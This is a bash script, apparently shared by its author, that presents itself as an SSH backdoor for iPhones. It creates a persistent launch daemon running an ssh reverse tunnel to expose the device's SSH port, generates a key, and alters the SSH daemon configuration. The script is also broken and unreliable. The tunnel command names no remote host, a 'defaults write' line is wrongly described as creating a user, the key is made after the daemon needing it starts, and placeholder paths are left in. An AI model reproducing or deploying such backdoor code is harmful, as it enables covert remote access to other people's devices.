#!/bin/bash

set -e

#SSH backdoor for iPhone: Made by ClumsyLulz Twitter[dot]com/ClumsyLulz

#Create a new user on the iPhone
defaults write /var/mobile/Library/Preferences/com.apple.mobile.installation.plist userhome_uid 501

#Create a folder in the user's home directory
mkdir -p /var/mobile/Containers/Data/Application/<unique-identifier>

#Copy the SSH binary to that folder
cp /usr/bin/ssh /var/mobile/Containers/Data/Application/<unique-identifier>/ssh

#Change permissions for the binary
chmod +x /var/mobile/Containers/Data/Application/<unique-identifier>/ssh

#Create a launch daemon to run the binary
cat << EOF > /Library/LaunchDaemons/com.example.ssh.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>Label</key>
        <string>com.example.ssh</string>
        <key>ProgramArguments</key>
        <array>
                <string>/var/mobile/Containers/Data/Application/<unique-identifier>/ssh</string>
                <string>-i</string>
                <string>/var/mobile/Containers/Data/Application/<unique-identifier>/id_rsa</string>
                <string>-p</string>
                <string>2222</string>
                <string>-R</string>
                <string>8080:localhost:22</string>
        </array>
        <key>KeepAlive</key>
        <true/>
        <key>RunAtLoad</key>
        <true/>
        <key>UserName</key>
        <string>mobile</string>
</dict>
</plist>
EOF

#Load the launch daemon
launchctl load -w /Library/LaunchDaemons/com.example.ssh.plist

#Create the SSH key
ssh-keygen -t rsa -b 4096 -f /var/mobile/Containers/Data/Application/<unique-identifier>/id_rsa

#Create a new SSH config file
cat << EOF > /etc/ssh/sshd_config.d/99-iphone-backdoor.conf
PasswordAuthentication no
EOF

#Enable the new SSH config file
echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config

#Restart the SSH daemon
launchctl stop com.openssh
